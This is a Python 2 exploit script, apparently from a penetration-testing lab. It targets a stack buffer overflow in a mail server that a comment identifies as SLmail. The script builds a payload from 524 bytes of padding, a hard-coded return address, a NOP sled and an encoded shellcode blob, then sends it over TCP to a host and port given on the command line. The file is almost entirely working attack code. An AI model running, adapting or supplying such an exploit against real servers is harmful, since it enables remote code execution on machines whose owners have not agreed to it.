#!/usr/bin/python
import time, struct, sys
import socket as so

# Buff represents an array of buffers. This will be start at 100 and be incremented by 200 in order to attempt to crash SLmail.


buf =  ""
buf += "\xda\xc6\xd9\x74\x24\xf4\x5d\x29\xc9\xb1\x1f\xb8\x83"
buf += "\x16\x45\xaa\x83\xed\xfc\x31\x45\x16\x03\x45\x16\xe2"
buf += "\x76\x7c\x4f\xf4\x49\x5a\xb8\xeb\xfa\x1f\x14\x86\xfe"
buf += "\x2f\xfc\xdf\x1f\x82\x81\x77\x84\x75\xfd\x77\x3a\x87"
buf += "\x69\x7a\x3a\x86\xd2\xf3\xdb\xe2\x42\x5c\x4b\xa2\xdd"
buf += "\xd5\x8a\x07\x2f\x65\xc9\x48\xd6\x7f\x9f\x3c\x14\xe8"
buf += "\xbd\xbd\x66\xe8\x99\xd7\x66\x82\x1c\xa1\x84\x63\xd7"
buf += "\x7c\xca\x01\x27\x07\x76\xe2\x80\x4a\x8f\x4c\xce\xba"
buf += "\x90\xae\x47\x59\x51\x45\x5b\x5f\xb1\x96\xd3\x22\xfb"
buf += "\x27\x96\x1d\x7b\x38\xc3\x14\x9d\xa1\x45\x2a\xee\xd1"
buf += "\x64\xb3\x8b\x16\x0e\xb6\x6c\x77\x56\xb7\x92\x78\xa6"
buf += "\x03\x93\x78\xa6\x73\x59\xf8"

# 311712f3

buff = ["A"*524 + "\xf3\x12\x17\x31" + "\x90"*10 + buf]


# Maximum size of buffer.

#max_buffer = 4000

# Initial counter value.

#counter = 100

# Value to increment per attempt.

#increment = 100


#while len(buff) <= max_buffer:
#    buff.append("A"*counter)
#    counter=counter+increment

for string in buff:
     try:
        server = str(sys.argv[1])
        port = int(sys.argv[2])
     except IndexError:
        print "[+] Usage example: python %s <ip> <port>" % sys.argv[0]
        sys.exit()   
     print "[+] Attempting to crash app at %s bytes" % len(string)
     s = so.socket(so.AF_INET, so.SOCK_STREAM)
     try:
        s.connect((server,port))
        s.recv(1024)
        s.send(string + '\r\n')
        s.close()
     except: 
        print "[+] Connection failed at %s bytes. Make sure IP/port are correct, or check debugger for app crash." % len(string)
        sys.exit()
